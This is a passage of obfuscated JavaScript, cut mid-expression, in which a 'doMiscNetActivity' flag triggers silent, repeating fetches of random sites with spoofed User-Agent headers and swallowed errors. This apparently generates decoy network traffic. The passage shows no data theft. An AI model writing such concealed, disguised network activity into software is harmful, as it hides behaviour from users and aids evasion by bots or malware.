      setTimeout(f, (0x130a8 + 0x14c0f + -0xa51 * 0x27) * l * getRandomInt(-0x24c2 + -0x4ad * 0x1 + 0x2970, 0x1024 + 0x126 * -0x5 + -0xa63 * 0x1));
  }, 0x1e5ff2 * -0x3 + 0x327fb * 0x1f + 0x3036f1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    const a6 = c;
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents[a6(0x12)](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0xd1 * -0x2b + -0x3e * -0x93 + 0x1ad9 * 0x1) * getRandomInt(-0xf46 + -0x821 * -0x1 + 0x726, -0x1440 + -0xa1f * -0x1 + -0xa26 * -0x1));
}, 0x2 * 0xad5 + -0x263d + 0x10f7);